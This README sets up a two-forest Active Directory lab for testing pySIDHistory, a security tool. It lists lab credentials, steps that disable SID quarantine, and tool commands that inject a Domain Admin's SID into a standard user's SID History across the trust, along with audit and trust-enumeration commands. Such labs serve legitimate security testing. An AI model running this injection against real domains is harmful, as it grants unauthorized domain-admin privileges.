# pySIDHistory - Lab Environment

2 Windows Server 2019 DCs, 2 forests, 1 bidirectional forest trust with SID History enabled.

## Requirements

- VirtualBox 6.1+
- Vagrant 2.3+
- ~4.5 GB RAM available
- ~40 GB disk (Windows boxes)

## Network

| Machine | Domain | IP | RAM |
|---------|--------|----|-----|
| DC1 | lab1.local | 192.168.56.10 | 2.5 GB |
| DC2 | lab2.local | 192.168.56.11 | 2 GB |
| Host (attackbox) | - | 192.168.56.1 | - |

## Deployment

The lab must be deployed in order. Each DC reboots after AD DS promotion.

```bash
cd lab/

# Step 1: Deploy DC1 (lab1.local) - ~15 min
vagrant up dc1

# Step 2: Deploy DC2 (lab2.local) - ~15 min
vagrant up dc2

# Step 3: Establish the forest trust (run from DC1)
vagrant winrm dc1 -c "powershell -File C:\vagrant\scripts\setup-trust.ps1"
```

If DC promotion triggers a reboot and Vagrant loses the WinRM session, run provisioning manually:

```bash
# Re-run configure phase after reboot
vagrant provision dc1 --provision-with configure-ad
vagrant provision dc2 --provision-with configure-ad
```

### Post-Deployment Setup

Add DC hostnames to your `/etc/hosts`:

```
192.168.56.10  dc1.lab1.local  lab1.local
192.168.56.11  dc2.lab2.local  lab2.local
```

Enable auditing on both DCs (required for DRSAddSidHistory):

```bash
# DC1 via Vagrant WinRM
vagrant winrm dc1 -c 'auditpol /set /category:"Account Management" /success:enable /failure:enable'

# DC2 — if WinRM is slow, use the rollback script
cd .. && ./lab/rollback.sh --all
```

## Credentials

| User | Domain | Password | Role |
|------|--------|----------|------|
| administrator | lab1.local | vagrant | Built-in Admin |
| da-admin | lab1.local | Password123! | Domain Admin |
| user1 | lab1.local | Password123! | Standard user (injection target) |
| user2 | lab1.local | Password123! | Standard user |
| svc-backup | lab1.local | Password123! | Service account |
| helpdesk | lab1.local | Password123! | Helpdesk operator |
| administrator | lab2.local | vagrant | Built-in Admin |
| da-admin2 | lab2.local | Password123! | Domain Admin |
| target-user | lab2.local | Password123! | Standard user |
| migrate-user | lab2.local | Password123! | Standard user |
| svc-sql | lab2.local | Password123! | Service account |

## Testing pySIDHistory

```bash
# Cross-forest injection via DRSUAPI
python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
    --target user1 --source-user da-admin2 --source-domain lab2.local \
    --src-username da-admin2 --src-password 'Password123!' --src-domain lab2.local

# Verify injection
python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
    --query user1

# Full domain audit
python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
    --audit

# Enumerate trusts
python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
    --enum-trusts

# Full lab rollback (reset all users)
./lab/rollback.sh
```

## DRSAddSidHistory Prerequisites

The lab provisions all prerequisites for `IDL_DRSAddSidHistory` (opnum 20):

- Bidirectional forest trust with SID History enabled (`TREAT_AS_EXTERNAL` + `FOREST_TRANSITIVE`)
- DNS conditional forwarders configured both ways
- Firewall rules for LDAP (389), Kerberos (88), RPC (135, 49152-65535), SMB (445), DNS (53)
- `TcpipClientSupport = 1` in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`

The following must be enabled **after deployment** (done by `rollback.sh --all`):

- Auditing: `auditpol /set /category:"Account Management" /success:enable /failure:enable` on both DCs
- Audit groups: `LAB1$$$` and `LAB2$$$` local groups on both DCs

## Management

```bash
# Access DCs
vagrant winrm dc1
vagrant winrm dc2

# Stop lab (preserves state)
vagrant halt

# Start lab
vagrant up

# Destroy and rebuild
vagrant destroy -f && vagrant up dc1 && vagrant up dc2
```

## Troubleshooting

### Vagrant Hangs After DC Reboot

AD DS promotion reboots the VM. Vagrant may lose the WinRM session. If it hangs for more than 15 minutes:

1. Ctrl+C the vagrant process
2. Wait for the VM to finish rebooting (check VirtualBox UI)
3. Run: `vagrant provision dc2 --provision-with configure-ad`

### Shell `!` Escaping

`Password123!` may be mangled by bash/zsh history expansion. Always quote passwords with single quotes (`'Password123!'`) or use `set +H` to disable history expansion.

### Trust Creation Pitfalls

- `netdom trust /add` creates **external** trusts, not forest trusts. The lab uses .NET `Forest.CreateTrustRelationship()` for proper forest trusts.
- After trust creation, SID History must be enabled separately (`/enablesidhistory:yes`) and quarantine disabled (`/quarantine:no`).
- Verify trust with `--enum-trusts`: look for `FOREST_TRANSITIVE` + `TREAT_AS_EXTERNAL`.

### DRSAddSidHistory Error Codes

| Error | Meaning | Fix |
|-------|---------|-----|
| 8534 | Source and destination in same forest | Use cross-forest source domain |
| 8536 | Destination auditing not enabled | Enable auditing on destination DC |
| 8552 | Source auditing not enabled | Enable auditing on source DC |
| 5 | Access denied | Provide source domain creds (`--src-username/--src-password/--src-domain`) |
| 1376 | Audit group missing | Create `LAB1$$$`/`LAB2$$$` groups on both DCs |
